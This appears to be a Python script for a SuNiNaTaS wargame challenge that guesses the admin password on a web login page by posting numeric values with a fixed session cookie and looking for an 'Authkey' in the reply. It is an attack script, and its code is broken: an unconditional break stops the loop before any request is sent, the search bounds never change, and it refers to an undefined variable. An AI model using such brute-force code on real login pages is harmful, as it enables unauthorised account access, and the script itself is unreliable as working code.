import requests
URL="http://suninatas.com/Part_one/web08/web08.asp"
 
cookie={
    "ASPSESSIONIDQSAQARDT":"KGINHHNDLGKFBLCDGBHAPECB"
    }
session1=requests.Session()

l_h_m = [0, 10000, 5000]

while True :
    l_h_m[2] = int((l_h_m[0]+l_h_m[1])/2)
    for i in l_h_m :
        print (i)
    break
    data1={
        "id":"admin",
        "pw":i
       }
 
    req=session1.post(URL, cookies=cookie, data=data1)
    if (req.text.find("Password Incorrect!") == -1 ) :
        index=req2.text.find("Authkey")
        print ("\n\n")
        print (req2.text[index:index+30])
        print ("\n\n")
        input("Press Any KEY to exit......")
        exit (0)
    else :
        print ("Wrong Num : "+str(i))
